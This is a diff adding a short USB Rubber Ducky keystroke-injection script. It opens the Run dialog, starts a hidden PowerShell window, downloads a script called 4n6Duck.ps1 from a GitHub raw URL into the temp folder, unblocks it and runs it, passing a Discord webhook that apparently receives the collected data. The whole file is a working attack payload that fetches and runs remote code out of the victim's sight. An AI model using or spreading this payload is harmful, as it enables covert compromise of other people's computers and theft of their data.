@@ -1,0 +1,8 @@
+REM Downloads files using PowerShell Invoke-WebRequest
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+STRING $u='https://raw.githubusercontent.com/K4INU/4n6-duck/refs/heads/main/4n6Duck.ps1'; $o=Join-Path $env:TEMP '4n6Duck.ps1'; iwr -Uri $u -OutFile $o; Unblock-File -Path $o; & $o -webhook 'https://discord.com/api/webhooks/{replace_me}'
+DELAY 1000
